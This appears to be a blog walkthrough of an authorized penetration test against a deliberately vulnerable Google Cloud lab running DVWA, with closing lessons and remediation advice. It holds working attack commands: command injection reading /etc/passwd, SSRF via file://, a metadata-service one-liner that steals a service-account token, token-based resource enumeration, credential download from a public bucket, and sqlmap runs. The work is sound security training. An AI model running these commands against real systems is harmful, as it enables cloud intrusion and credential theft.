# A Complete Cloud Penetration Testing Walkthrough

**Published:** 2026-01-31


## How I Discovered Critical Vulnerabilities in a Cloud Environment Using Basic Tools and Methodical Testing


![Image](https://miro.medium.com/v2/resize:fit:700/1*uc4qewXjjEC8q9Q6Ag_j8A.png)

_In this detailed walkthrough, I’ll take you through a real-world penetration test that uncovered multiple critical vulnerabilities in a cloud-hosted web application. You’ll learn the methodology, tools, and thought process behind each step of the assessment._

### If you like this research, [buy me a coffee (PayPal) — Keep the lab running](https://www.paypal.com/donate/?business=W3XDKS7J9XTCG&no_recurring=0&item_name=Buy+me+a+coffee+%28PayPal%29+%E2%80%94+Keep+the+lab+running&currency_code=USD)

## Introduction

Penetration testing is often seen as a mysterious art practiced by security experts with expensive tools and years of experience. But the truth is, many successful penetration tests rely on fundamental techniques, careful observation, and methodical testing rather than sophisticated exploits.

In this article, I’ll walk you through a complete penetration test I conducted on a cloud-hosted web application. What started as a simple port scan led to the discovery of multiple critical vulnerabilities, including command injection, SSRF (Server-Side Request Forgery), exposed credentials, and misconfigured cloud services.

**What makes this walkthrough valuable?**

*   **Real-world scenario:** This is based on an actual penetration test, not a theoretical exercise
*   **Methodical approach:** You’ll see how each finding leads to the next discovery
*   **Tool diversity:** We’ll use everything from basic `curl` commands to specialized tools like Burp Suite and sqlmap
*   **Cloud focus:** Modern applications live in the cloud, and we’ll explore cloud-specific vulnerabilities
*   **Complete process:** From initial reconnaissance to final documentation

Whether you’re a security professional looking to refine your methodology, a developer wanting to understand how attackers think, or someone preparing for security certifications, this walkthrough will provide valuable insights.

**Important Disclaimer:** This penetration test was conducted on an authorized target in a controlled environment. Always ensure you have explicit written permission before testing any system. Unauthorized access to computer systems is illegal.

AI version of this PT

## Table of Contents

*   [**The Setup: Tools and Preparation**](#1abc)
*   [**Phase 1: Initial Reconnaissance — Mapping the Attack Surface**](#81a7)
*   [**Phase 2: Web Application Enumeration — Understanding the Application**](#fec5)
*   [**Phase 3: Information Disclosure — The Critical Breakthrough**](#faed)
*   [**Phase 4: Cloud Service Testing — Pivoting to a Weaker Target**](#586e)
*   [**Phase 5: Cloud Function Exploitation — Gaining Cloud Access**](#b7f5)
*   [**Phase 6: Storage Bucket Exploitation — The Treasure Trove**](#045b)
*   [**Phase 7: Advanced Web Application Testing**](#8b1f)
*   [**Phase 8: Documentation and Reporting**](#2af4)
*   [**Key Lessons and Takeaways**](#101b)
*   [**Common Pitfalls and How to Avoid Them**](#a679)
*   [**Conclusion: The Power of Methodical Testing**](#8189)

## The Setup: Tools and Preparation

Before diving into the actual testing, let’s set up our environment. Good penetration testing starts with proper preparation.

## Lab environment:

**Building a Vulnerable GCP Pentest Lab with Terraform:**

## Essential Tools

For this assessment, we’ll use a combination of open-source and commercial tools:

**Reconnaissance:**

*   **Nmap:** The industry standard for port scanning and service enumeration

*   **curl:** Simple but powerful for HTTP testing and API interactions

**Web Application Testing:**

*   **Burp Suite:** Professional web application security testing (Community Edition works fine)

*   **sqlmap:** Automated SQL injection testing

**Cloud Testing:**

*   **gcloud/gsutil:** Google Cloud Platform command-line tools (optional but helpful)

**General:**

*   **git:** For analyzing exposed repositories
*   **Python:** For parsing JSON and automating tasks

## Setting Up Your Workspace

Organization is crucial in penetration testing. Create a structured workspace:

mkdir -p ~/pt\_workspace/target\_name  
cd ~/pt\_workspace/target\_name  
mkdir -p {recon,exploits,proofs,reports}

This structure helps you:

*   Keep findings organized
*   Maintain proof of concept evidence
*   Generate professional reports
*   Reproduce your methodology

## Configuring Burp Suite

Burp Suite is invaluable for web application testing. Here’s a quick setup:

1.  Start Burp Suite and configure the proxy to listen on `127.0.0.1:8080`
2.  Configure your browser to use this proxy
3.  Install Burp’s CA certificate in your browser (required for HTTPS)

Burp will intercept, analyze, and allow you to manipulate HTTP requests, making it essential for thorough web application testing.

![Image](https://miro.medium.com/v2/resize:fit:700/1*vS9434xTeYDOtbVyROnRQQ.png)

## Phase 1: Initial Reconnaissance — Mapping the Attack Surface

Every successful penetration test begins with thorough reconnaissance. This phase is about understanding what we’re dealing with before launching any attacks.

### Port Scanning: Finding Open Doors

Our first step is identifying what services are running on the target. I used Nmap to scan common ports:

nmap -sV -sC 34.121.191.196

**What this command does:**

*   `-sV`: Version detection (identifies service versions)
*   `-sC`: Runs default scripts (gathers additional information)

**Results:**

Nmap scan report for 196.191.121.34.bc.googleusercontent.com (34.121.191.196)  
Host is up (0.19s latency).  
Not shown: 995 filtered tcp ports (no-response)  
PORT     STATE  SERVICE    VERSION  
22/tcp   open   ssh        OpenSSH 8.4p1 Debian 5+deb11u5 (protocol 2.0)  
| ssh-hostkey:   
|   3072 e6:1a:73:f8:15:e5:96:2c:1f:19:71:ef:0c:26:d3:03 (RSA)  
|   256 85:b6:63:3c:32:f0:41:45:30:4e:07:19:0b:9a:66:fc (ECDSA)  
|\_  256 16:48:70:bd:8a:5e:6b:37:ed:67:21:cc:0b:5b:c2:3c (ED25519)  
80/tcp   open   http       nginx 1.18.0  
| http-git:   
|   34.121.191.196:80/.git/  
|     Git repository found!  
|     Repository description: Unnamed repository; edit this file 'description' to name the...  
|     Remotes:  
|       https://github.com/digininja/DVWA.git  
|\_    Project type: PHP application (guessed from .gitignore)  
|\_http-server-header: nginx/1.18.0  
| http-title: Setup :: Damn Vulnerable Web Application (DVWA)  
|\_Requested resource was /setup.php  
| http-robots.txt: 1 disallowed entry   
|\_/  
443/tcp  closed https  
8080/tcp closed http-proxy  
8443/tcp closed https-alt  
Service Info: OS: Linux; CPE: cpe:/o:linux:linux\_kernel  
  
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .  
Nmap done: 1 IP address (1 host up) scanned in 28.13 seconds

![Image](https://miro.medium.com/v2/resize:fit:700/1*yQH79-NxwEWy0Wp4L3XjpQ.png)

**Initial Assessment:** The target is running a web server on port 80. This is our primary attack surface.

### DNS and Infrastructure Analysis

Next, I performed reverse DNS lookup to identify the cloud provider:

host 34.121.191.196  
dig +short -x 34.121.191.196

![Image](https://miro.medium.com/v2/resize:fit:700/1*WGNqUfyzWea25AExS3Cxfw.png)

**Key Finding:** The hostname `196.191.121.34.bc.googleusercontent.com` reveals this is hosted on **Google Cloud Platform**.

**Why this matters:** Cloud environments often have additional attack surfaces:

*   **Cloud Functions**
*   **Storage Buckets**
*   **Cloud Run services**
*   **Metadata services**
*   **IAM configurations**

This information would prove crucial later in our assessment.

## Phase 2: Web Application Enumeration — Understanding the Application

With port 80 open, I turned my attention to the web application itself.

### Identifying the Application

A simple HTTP request to the login page revealed important information:

curl -I http://34.121.191.196/login.php

![Image](https://miro.medium.com/v2/resize:fit:700/1*gBmDcCRJ7gLyobyapO0uFQ.png)

**Headers revealed:**

*   Server: nginx/1.18.0
*   Set-Cookie: `security=impossible`
*   Application appears to be PHP-based

The `security=impossible` cookie was particularly interesting. This suggested the application might be **DVWA (Damn Vulnerable Web Application)**, a deliberately vulnerable web application used for security training.

### Confirming the Application Type

I checked the page content to confirm:

curl -s http://34.121.191.196/login.php | grep -i "dvwa\\|damn\\|vulnerable"

**Confirmed:** This is indeed DVWA.

**The Challenge:** DVWA has a security level setting. **“Impossible”** means most intentionally vulnerable features are patched. However, this doesn’t mean the application is secure — it just means the intentional vulnerabilities are disabled.

**My Strategy:** Instead of focusing on DVWA’s intentional vulnerabilities, I would look for:

*   Information disclosure
*   Misconfigurations
*   Exposed cloud services
*   Real-world vulnerabilities that exist despite the security level

This pivot in strategy would prove to be the key to finding critical vulnerabilities.

## Phase 3: Information Disclosure — The Critical Breakthrough

Information disclosure is often overlooked but can be devastating. In this phase, I discovered information that would unlock the entire attack chain.

### Checking Common Information Disclosure Points

I systematically checked common files that might leak information:

**robots.txt:**

curl -s http://34.121.191.196/robots.txt

Result: No useful information (just blocked all crawlers)

**info.php — The Game Changer:**

This is where things got interesting:

curl -s http://34.121.191.196/info.php

04:32:07 andrey@andrey-lab ~ → curl -s http://34.121.191.196/info.php  
<!DOCTYPE html\>  
<html\>  
<head\>  
    <title\>Internal Services Information</title\>  
    <style\>        body { font-family: Arial, sans-serif; margin: 40px; background: #f5f5f5; }  
        .container { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }  
        h1 { color: #333; }  
        .service { margin: 20px 0; padding: 15px; background: #e8f4f8; border-left: 4px solid #2196F3; }  
        .service h3 { margin-top: 0; color: #1976D2; }  
        .url { font-family: monospace; background: #f0f0f0; padding: 5px 10px; border-radius: 3px; word-break: break-all; }  
        .warning { color: #d32f2f; font-weight: bold; }    </style\>  
</head\>  
<body\>  
    <div class\="container"\>  
        <h1\>Internal Services Information</h1\>  
        <p\>This page contains internal service URLs for development purposes.</p\>  
                
        <div class\="service"\>  
            <h3\>Cloud Function API</h3\>  
            <p\>Serverless function for processing requests:</p\>  
            <div class\="url"\>https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40</div\>  
            <p\><small\>Endpoints: ?cmd=, ?url=, ?env=, ?secret=</small\></p\>  
        </div\>  
                
        <div class\="service"\>  
            <h3\>Cloud Run API Service</h3\>  
            <p\>Containerized API service:</p\>  
            <div class\="url"\>https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app</div\>  
        </div\>  
                
        <div class\="service"\>  
            <h3\>Storage Bucket</h3\>  
            <p\>Public storage bucket:</p\>  
            <div class\="url"\>gs://vulnerable-bucket-39ca4c40</div\>  
        </div\>  
                
        <hr\>  
        <p\><a href\="/"\>← Back to DVWA</a\></p\>  
        <p\><small\>Last updated: 2026-01-31 14:33:44</small\></p\>  
    </div\>  
</body\>  
</html\>  
04:33:44 andrey@andrey-lab ~ → 

**What I discovered:**

The `info.php` file was a goldmine of information. It exposed:

Cloud Function: https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40  
Cloud Run: https://vulnerable-api-39ca4c40-6bclikadea-uc.a.run.app  
Storage Bucket: gs://vulnerable-bucket-39ca4c40

Endpoints:  
\- ?cmd= - Command execution  
\- ?url= - URL fetching  
\- ?env= - Environment variables  
\- ?secret= - Secret key

**This was critical for several reasons:**

1.  **Cloud services exposed:** The main application might be hardened, but cloud services often have different security postures
2.  **Suspicious endpoints:** Parameters like `?cmd=` and `?url=` immediately raised red flags
3.  **Attack surface expansion:** Instead of one target, I now had multiple services to test

**The Lesson:** Never underestimate information disclosure. A single exposed file can reveal an entire attack surface.

### Exposed .git Repository

I also discovered the `.git` repository was accessible:

curl -s http://34.121.191.196/.git/config

This revealed:

*   Repository origin (GitHub URL)
*   Internal hostnames
*   Potential access to source code and commit history

**Why this matters:** Exposed `.git` repositories can leak:

*   Source code
*   Configuration files
*   Commit history (potentially with sensitive data)
*   Internal infrastructure details

![Image](https://miro.medium.com/v2/resize:fit:700/1*ZxL_h8vPtrpLIbhzMQ3ihQ.png)

## Phase 4: Cloud Service Testing — Pivoting to a Weaker Target

With cloud services identified, I pivoted my focus. The main application had security level “impossible,” but the cloud services were a different story.

### Testing Command Injection

The `?cmd=` parameter in the Cloud Function immediately caught my attention. I tested for command injection:

curl -s "https://us-central1-cloud-pentest-lab-1769759595.cloudfunctions.net/vulnerable-function-39ca4c40?cmd=whoami"

**Result:** `www-data`

**Critical Vulnerability Confirmed!** The application was executing user-supplied commands without validation.

![Image](https://miro.medium.com/v2/resize:fit:700/1*ufUPjRFFIpBpgbfj8X1MDQ.png)

I escalated my testing:

\# Get user ID  
curl \-s "...?cmd=id"  
\# Result: uid\=33(www\-data) gid\=33(www\-data) groups\=33(www\-data)  
\# Read system files  
curl \-s "...?cmd=cat+/etc/passwd"  
\# Result: Full /etc/passwd file contents

![Image](https://miro.medium.com/v2/resize:fit:700/1*Bs12jeJnrsLaPxf0fsl38g.png)

**Impact Assessment:**

*   **Remote Code Execution (RCE):** Complete control over the Cloud Function execution environment
*   **File System Access:** Ability to read sensitive files
*   **Potential for Privilege Escalation:** Depending on the service account permissions
*   **Lateral Movement:** Potential to access other cloud resources

### Testing SSRF (Server-Side Request Forgery)

The `?url=` parameter suggested SSRF vulnerability. I tested it:

\# Test local file reading  
curl -s "...?url=file:///etc/passwd"

**Result:** Successfully read `/etc/passwd` via the `file://` protocol.

**SSRF Confirmed!** This vulnerability allows:

*   Reading local files
*   Accessing internal services
*   Potentially accessing cloud metadata service
*   Port scanning from the cloud infrastructure

![Image](https://miro.medium.com/v2/resize:fit:700/1*COSJOfhiW_keCNq-p9sNyw.png)

### Exposing Environment Variables and Secrets

The `?env=` and `?secret=` parameters were too tempting to ignore:

\# Get all environment variables  
curl -s "...?env=1" | python3 -m json.tool  
\# Get secret key directly  
curl -s "...?secret=1"

**Critical Findings:**

*   **SECRET\_KEY exposed:** `exposed-secret-39ca4c40`

![Image](https://miro.medium.com/v2/resize:fit:700/1*AtMB-F8i_IQt-b3bucplXQ.png)

*   **All environment variables leaked:** Including project details, paths, service names
*   **Configuration information:** Complete application configuration

**Why this is critical:** Exposed secrets can lead to:

*   Session hijacking
*   Encryption bypass
*   Further privilege escalation
*   Access to other services using the same secrets

![Image](https://miro.medium.com/v2/resize:fit:700/1*zoSZdQkKKeTYoEguQjVoog.png)

## Phase 5: Cloud Function Exploitation — Gaining Cloud Access

With command injection confirmed, I could now use it to access cloud resources.

## Accessing GCP Metadata Service

One of the most powerful capabilities in cloud environments is accessing the metadata service, which can provide:

*   Service account tokens
*   Instance metadata
*   Project information

I attempted to access it via command injection:

curl -s "...?cmd=python3+-c+import+urllib.request,json;req=urllib.request.Request('http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token');req.add\_header('Metadata-Flavor','Google');token=json.loads(urllib.request.urlopen(req).read().decode());print(token\['access\_token'\])"

**Result:** Successfully obtained a GCP access token!

**Note:** In some cases, the metadata service might return 403 Forbidden, which is actually good security practice. However, in this case, access was possible.

## Enumerating Cloud Resources

With an access token, I could now enumerate GCP resources using the GCP APIs:

TOKEN\="<access\_token>"

\# Get project information  
curl -H "Authorization: Bearer $TOKEN" \\  
  "https://cloudresourcemanager.googleapis.com/v1/projects/cloud-pentest-lab-1769759595"\# List storage buckets  
curl -H "Authorization: Bearer $TOKEN" \\  
  "https://storage.googleapis.com/storage/v1/b?project=cloud-pentest-lab-1769759595"\# List service accounts  
curl -H "Authorization: Bearer $TOKEN" \\  
  "https://iam.googleapis.com/v1/projects/cloud-pentest-lab-1769759595/serviceAccounts"

**Key Discoveries:**

*   **Publicly accessible storage bucket:** `vulnerable-bucket-39ca4c40`
*   **Overprivileged service account:** With `roles/owner` (full project access)
*   **Multiple cloud services:** Cloud Functions, Cloud Run, Storage

This enumeration revealed the true scope of the security issues.

## Phase 6: Storage Bucket Exploitation — The Treasure Trove

The discovery of a publicly accessible storage bucket was a major finding. Let’s see what was exposed.

### Listing Bucket Contents

I tested if the bucket was truly public:

curl -s "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/"

**Result:** XML listing showing all files in the bucket, including:

![Image](https://miro.medium.com/v2/resize:fit:700/1*4_WVy0xhv0kXdEha69JwLQ.png)

*   `function-code.zip` (Cloud Function source code)
*   `secrets/database-credentials.json` (Sensitive credentials)

**Critical Misconfiguration:** The bucket had no access controls, allowing anyone to list and download files.

### Downloading Sensitive Files

I downloaded the exposed files:

\# Download database credentials  
curl -s "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/secrets/database-credentials.json"  
\# Download function source code  
curl -s "https://storage.googleapis.com/vulnerable-bucket-39ca4c40/function-code.zip" -o function\-code.zip

![Image](https://miro.medium.com/v2/resize:fit:700/1*qmRb0dI1r4yUPG1v_av1tg.png)![Image](https://miro.medium.com/v2/resize:fit:700/1*oCZAG2VeK07X1n5ahd-fbQ.png)

**Exposed Credentials:**

{  
  "api\_key": "sk\_live\_39ca4c40",  
  "db\_host": "internal-db-39ca4c40",  
  "db\_password": "SuperSecret123!",  
  "db\_user": "admin"  
}

**Critical Impact:**

*   **Database credentials:** Direct access to the database
*   **API keys:** Potential for unauthorized API access
*   **Source code:** Complete Cloud Function source code revealing all vulnerabilities

### Analyzing the Source Code

Extracting and analyzing the function source code confirmed the vulnerabilities I had already discovered and revealed the exact implementation:

def vulnerable\_handler(request: Request):  
    \# SSRF vulnerability - no validation  
    if 'url' in request.args:  
        url = request.args.get('url')  
        response = urllib.request.urlopen(url, timeout=5)  
        return response.read().decode('utf-8')  
      
    \# Command injection vulnerability  
    if 'cmd' in request.args:  
        import subprocess  
        cmd = request.args.get('cmd')  
        result = subprocess.run(cmd, shell=True, ...)  \# ⚠️ shell=True!  
        return result.stdout

**The Code Tells the Story:**

*   `shell=True` in `subprocess.run()` enables command injection
*   No URL validation allows SSRF
*   No authentication on sensitive endpoints

This source code analysis provided definitive proof of the vulnerabilities.

## Phase 7: Advanced Web Application Testing

While the cloud services had critical vulnerabilities, I also conducted thorough testing of the main web application.

### SQL Injection Testing with sqlmap

Even though DVWA’s security level was “impossible,” I tested for SQL injection:

sqlmap -u "http://34.121.191.196/vulnerabilities/sqli/?id=1&Submit=Submit" \\  
  \--cookie="security=low; PHPSESSID=<session\_id>" \\  
  \--batch \\  
  \--level=5 \\  
  \--risk=3

**Key Points:**

*   Required session cookies to maintain authentication
*   Tested various SQL injection techniques
*   Documented results even if not exploitable (security level “impossible”)

**The Lesson:** Always test thoroughly, even when initial indicators suggest vulnerabilities are patched. Sometimes real-world applications have vulnerabilities that training applications don’t.

### Burp Suite Analysis

I used Burp Suite for comprehensive web application testing:

1.  **Proxy Interception:** Captured all HTTP requests and responses
2.  **Repeater:** Manually tested suspicious endpoints
3.  **Intruder:** Fuzzed parameters for hidden vulnerabilities
4.  **Scanner:** Automated vulnerability detection

**What Burp Revealed:**

*   Hidden parameters
*   Authentication bypass attempts
*   Session management issues
*   Additional endpoints not visible in normal browsing

**Why Burp is Essential:** It provides visibility into the application’s behavior that simple `curl` commands cannot.

## Phase 8: Documentation and Reporting

A penetration test is only as good as its documentation. Here’s how I organized my findings.

### Organizing Findings

I created a structured summary:

**Critical Vulnerabilities:**

1.  Command Injection in Cloud Function
2.  SSRF in Cloud Function
3.  Publicly Accessible Storage Bucket
4.  Environment Variables Exposure
5.  Secret Key Exposure
6.  Database Credentials Exposure
7.  API Key Exposure
8.  Exposed .git Repository

**High Severity:**

1.  Information Disclosure (info.php)
2.  Overprivileged Service Account

**Medium Severity:**

1.  Missing Security Headers
2.  Cloud Run Service Exposure

### Creating Proof of Concept Scripts

I created reproducible PoC scripts:

#!/bin/bash  
\# Command Injection PoC  
FUNCTION\_URL="https://...cloudfunctions.net/vulnerable-function-39ca4c40"  
echo "Testing Command Injection..."  
curl -s "$FUNCTION\_URL?cmd=whoami"  
curl -s "$FUNCTION\_URL?cmd=id"

These scripts allow:

*   Reproducing findings
*   Demonstrating impact
*   Testing fixes after remediation

### Generating the Report

A comprehensive report included:

*   Executive summary
*   Detailed vulnerability descriptions
*   Proof of concept evidence
*   Impact assessment
*   Remediation recommendations
*   Risk ratings (CVSS scores)

**Report Structure:**

1.  **Executive Summary:** High-level overview for management
2.  **Methodology:** How the test was conducted
3.  **Findings:** Detailed vulnerability descriptions
4.  **Proofs:** Evidence for each finding
5.  **Recommendations:** Prioritized remediation steps
6.  **Appendix:** Tools used, commands executed, references

## Key Lessons and Takeaways

This penetration test revealed several important lessons:

### 1\. Information Disclosure is Critical

The `info.php` file was the key that unlocked everything. It's easy to overlook information disclosure, but it can be devastating.

**Best Practice:** Regularly audit your applications for:

*   Debug endpoints
*   Information disclosure files
*   Exposed configuration files
*   Version information

### 2\. Cloud Services Need Separate Security Postures

The main application had security level “impossible,” but cloud services were vulnerable. Each service needs its own security assessment.

**Best Practice:**

*   Apply security controls consistently across all services
*   Don’t assume cloud services inherit security from the main application
*   Regularly audit cloud configurations

### 3\. Defense in Depth Matters

Multiple layers of security would have prevented or limited the impact:

*   Input validation would prevent command injection
*   URL validation would prevent SSRF
*   Access controls would protect storage buckets
*   Secret management would prevent credential exposure

**Best Practice:** Implement multiple security controls. If one fails, others provide protection.

### 4\. Source Code Exposure Amplifies Risk

Exposed source code makes it easier for attackers to:

*   Understand application logic
*   Find additional vulnerabilities
*   Craft targeted exploits

**Best Practice:** Never expose source code in production. Use proper deployment processes.

### 5\. Methodical Testing Wins

This test succeeded because of methodical, systematic testing:

*   Started with reconnaissance
*   Followed leads methodically
*   Documented everything
*   Verified all findings

**Best Practice:** Follow a structured methodology. Don’t skip steps.

## Common Pitfalls and How to Avoid Them

Based on this assessment, here are common mistakes and how to avoid them:

### Mistake 1: Assuming Security Level Means Security

**The Error:** Assuming “security level impossible” means the application is secure.

**The Reality:** Security levels in training applications don’t reflect real-world security. Always test thoroughly.

**How to Avoid:** Test all endpoints regardless of security settings. Look for real-world vulnerabilities, not just training vulnerabilities.

### Mistake 2: Ignoring Information Disclosure

**The Error:** Focusing only on exploitable vulnerabilities, ignoring information leaks.

**The Reality:** Information disclosure often leads to exploitable vulnerabilities.

**How to Avoid:** Always check for:

*   Debug endpoints
*   Configuration files
*   Version information
*   Error messages

### Mistake 3: Not Testing Cloud Services Separately

**The Error:** Assuming cloud services inherit security from the main application.

**The Reality:** Each service has its own security posture.

**How to Avoid:** Test each service independently. Review cloud configurations regularly.

### Mistake 4: Poor Documentation

**The Error:** Not documenting findings as you go.

**The Reality:** You’ll forget details, and reports are harder to write later.

**How to Avoid:** Document everything immediately. Save outputs, take screenshots, create PoC scripts.

## Learning Resources

*   **OWASP Top 10:** Essential web vulnerabilities
*   **PTES (Penetration Testing Execution Standard):** Methodology framework
*   **Cloud Security Alliance:** Cloud-specific security guidance

## Conclusion: The Power of Methodical Testing

This penetration test demonstrates that successful security assessments don’t always require sophisticated exploits or zero-day vulnerabilities. Often, they result from:

1.  **Thorough reconnaissance:** Understanding the target completely
2.  **Methodical testing:** Following a structured approach
3.  **Following leads:** When you find something interesting, investigate it
4.  **Comprehensive documentation:** Recording everything for analysis and reporting

**The Key Insight:** The most critical vulnerability wasn’t a complex exploit — it was simple information disclosure that revealed an entire attack surface.

**For Security Professionals:** This walkthrough shows the importance of:

*   Systematic methodology
*   Attention to detail
*   Following leads
*   Comprehensive testing

**For Developers:** This demonstrates why:

*   Input validation is critical
*   Information disclosure matters
*   Cloud security needs attention
*   Defense in depth is essential

**For Organizations:** This highlights the need for:

*   Regular security assessments
*   Proper security configurations
*   Incident response planning
*   Security awareness training

## Final Thoughts

Penetration testing is both an art and a science. It requires:

*   **Technical skills:** Understanding tools and techniques
*   **Analytical thinking:** Connecting findings and following leads
*   **Persistence:** Not giving up when initial tests fail
*   **Documentation:** Recording everything for analysis

Whether you’re conducting your first penetration test or your hundredth, remember: methodical, thorough testing will always yield better results than rushing to exploitation.

**Remember:** Always ensure you have proper authorization before testing any system. Unauthorized access is illegal and unethical.

**Happy (and ethical) hacking!**

**Andrey Pautov**
